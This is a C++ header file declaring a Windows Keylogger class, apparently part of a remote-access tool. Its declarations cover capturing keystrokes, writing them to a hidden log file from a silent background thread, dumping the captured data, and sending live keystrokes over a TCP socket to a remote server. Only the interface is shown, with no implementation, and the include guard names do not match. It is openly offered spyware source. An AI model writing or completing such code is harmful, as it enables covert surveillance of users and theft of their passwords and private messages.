#ifndef KEYLOGG_H
#define KEYLOG_H

#include "master.h"

using namespace std;


class Keylogger
{
    public:

        Keylogger();
        //-----------------------------------------------
        VOID setup();
        //-----------------------------------------------
        wstring specialKey(INT &keystroke);
        wstring intToUnicode(INT keystroke);
        //-----------------------------------------------
        VOID directTcp();  //sends live keystrokes to the server.
        //-----------------------------------------------        
        VOID keyboardListeningAndWriteFile(CONST HANDLE &hFile); // for silenciousBackground
        static DWORD WINAPI silenciousThread(LPVOID Param); //start thread keyboardListeningAndWriteFile

        INT silenciousBackground(); //return 1 if error.  | In case of error the silent mod will not work. 
        INT createHideFileAndHideFile();
        VOID writeKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile);  
        vector <wstring> dumpAllData();// Returns all the data from the file that contains the keystrokes. 
        //-----------------------------------------------
        SOCKET getSocket();
        //-----------------------------------------------
        VOID setSocket(SOCKET &sock);
        //VOID setPathProg(wstring &path);
        //-----------------------------------------------
        HANDLE gethFile();
        //-----------------------------------------------
        ~Keylogger();
        
    private:
        
        SOCKET a_sock;
        HANDLE a_hFile;
        CONST WCHAR a_file_name[8] = L"log.txt";
        HWND a_WindowHandle;
        DWORD a_dwThreadId;
        HKL a_hkl;
     
};

DWORD WINAPI sendKeystrokeThread(LPVOID param);
DWORD WINAPI recvDataThread(LPVOID param);

//DWORD WINAPI directTcp(LPVOID param)

#endif